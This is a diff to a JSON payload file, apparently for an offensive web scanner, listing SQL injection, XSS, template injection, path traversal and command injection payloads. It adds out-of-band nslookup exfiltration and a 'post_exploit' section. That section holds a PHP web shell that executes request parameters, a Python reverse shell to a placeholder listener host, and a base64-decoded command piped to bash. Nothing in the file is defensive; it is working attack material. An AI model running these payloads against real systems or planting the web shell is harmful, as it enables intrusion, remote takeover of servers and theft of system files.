@@ -5,19 +5,32 @@
     "oob": ["' UNION SELECT LOAD_FILE(CONCAT('\\\\',(SELECT version()),'.{oob_domain}\\test'))-- -"]
   },
   "xss": {
-    "reflected": ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>", "javascript:alert(1)"],
-    "polyglot": ["\"'><script>alert(1)</script>", "'><svg/onload=alert(1)>"]
+    "reflected": ["<script>alert('Abaddon8')</script>", "<img src=x onerror=alert('Abaddon8')>", "javascript:alert('Abaddon8')"],
+    "polyglot": ["\"'><script>alert('Abaddon8')</script>", "'><svg/onload=alert('Abaddon8')>"]
   },
   "ssti": {
     "basic": ["{{7*7}}", "${7*7}", "<%= 7*7 %>"],
     "time": ["{{'a'.*sleep(5)}}", "{{7*7}}{{''[0].__class__.__mro__[1].__subclasses__()}}"]
   },
   "lfi": {
-    "basic": ["../../../etc/passwd", "....//....//....//etc/passwd"],
-    "nullbyte": ["../../../etc/passwd%00"]
+    "basic": ["../../../../../../etc/passwd", "..\\..\\..\\..\\..\\..\\windows\\win.ini"],
+    "nullbyte": ["../../../../../../etc/passwd%00"]
   },
   "rce": {
     "basic": [";id", "|id", "`id`", "$(id)"],
-    "time": [";sleep 5", "`sleep 5`"]
+    "time": [";sleep 5", "`sleep 5`"],
+    "oob": ["; nslookup {oob_domain}", "| nslookup {oob_domain}"]
+  },
+  "post_exploit": {
+    "web_shell_upload": {
+      "filename": "abd-shell.php",
+      "content": "<?php if(isset($_REQUEST['cmd'])){ echo '<pre>'; $cmd = ($_REQUEST['cmd']); system($cmd); echo '</pre>'; die; }?>"
+    },
+    "reverse_shell_python": {
+      "command": "python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/sh\")'"
+    },
+    "reverse_shell_bash_b64": {
+      "command": "echo {base64_payload} | base64 -d | bash"
+    }
   }
 }
